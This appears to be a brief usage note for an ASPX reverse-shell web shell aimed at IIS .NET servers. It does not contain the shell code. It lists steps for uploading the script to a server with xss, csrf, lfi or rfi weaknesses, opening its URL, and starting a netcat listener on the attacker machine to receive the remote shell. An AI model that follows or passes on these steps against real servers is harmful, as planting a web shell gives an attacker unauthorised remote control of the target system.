# iis_asp_dot_net_reverse_shell.aspx
# NOTE: ASPX script uses example attacker machine IP:PORT - 127.0.0.1:8080

Instructions:

1.) Upload aspx script to iis .net web server vulnerable to: 
xss/csrf/lfi/rfi

2.) Navigate to URL upload path:
http://example.com/iis_asp_dot_net_reverse_shell.aspx

3.) Setup listening port with netcat from attacker machine:
netcat -lv 0.0.0.0 -p 8080
